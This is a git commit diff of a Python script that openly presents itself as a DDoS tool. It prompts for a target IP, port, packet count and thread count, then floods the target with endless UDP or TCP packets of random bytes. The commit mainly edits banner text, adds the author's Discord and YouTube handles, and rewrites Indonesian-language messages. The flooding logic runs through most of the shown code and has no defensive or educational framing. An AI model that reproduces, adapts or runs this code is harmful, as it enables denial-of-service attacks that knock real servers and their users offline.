4bf4fc3522e1a5c2d471215428227df5ff21363e
GbzHnzz1 <83733922+GbzHnzz1@users.noreply.github.com>
2021-05-10 16:58:41 +0800

    Update GbHzz.py

--- GbHzz.py
+++ GbHzz.py
@@ -1,33 +1,35 @@
 #!/usr/bin/env python3
-#Code Test GbzHnzz
+#Code by Rizal
 import random
 import socket
 import threading
 
-print("~~~ DDOS TOOLS Gabriel Hanz(GbzHnzz) ~~~")
+print("~~~ DDOS BY Mr.GbzHnzz ~~~")
 print("~~~ Scripting By GbzHnzz ~~~")
-print("~~~ Jan Asal Ddos Ajg ~~~")
+print("~~~ SCRIPT DDOS ATTACK ~~~")\
+print("~~~ DISCORD : GbzHnz#3700 ~~~")
+print("~~~ YOUTUBE : GbzHnzz ~~~")
 ip = str(input(" TARGET (IP):"))
-port = int(input(" TARGET (PORT):"))
+port = int(input(" TAEGET (PORT):"))
 choice = str(input(" WITH UDP? (Y/N):"))
-times = int(input(" SERANGAN YANG DIKIRIM:"))
+times = int(input(" PAKET YANG DIKIRIMKAN:"))
 threads = int(input(" THREADS YANG DIKIRIM:"))
 def run():
 	data = random._urandom(1024)
-	i = random.choice(("[Bismillah HeadShot]","[Bismillah HeadShot]","[Bismillah HeadShot]"))
+	i = random.choice(("[Bismillah HeadShot!!!]","[Bismillah HeadShot!!!]","[Bismillah HeadShot!!!]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" PAKET BY GbzHnzz, NAPA GA SENENG? BY1 PAN8!!!!")
+			print(i +" PAKET OTW!!!!, APA GA SENENG? BY PAN8")
 		except:
-			print("[!] ERROR KEK OTAKLU!!")
+			print("[!] Error!!!")
 
 def run2():
 	data = random._urandom(16)
-	i = random.choice(("Bismillah HeadShot]","[Bismillah HeadShot]","[Bismillah HeadShot]"))
+	i = random.choice(("[Bismillah HeadShot!!!]","[Bismillah HeadShot!!!]","[Bismillah HeadShot!!!]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -35,10 +37,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" PAKET BY GbzHnzz, NAPA GA SENENG? BY1 PAN8!!!!")
+			print(i +" PAKET OTW!!!!, APA GA SENENG? BY PAN")
 		except:
 			s.close()
-			print("[*] ERROR KEK OTAK LU")
+			print("[*] Error")
             
 for y in range(threads):
 	if choice == 'y':
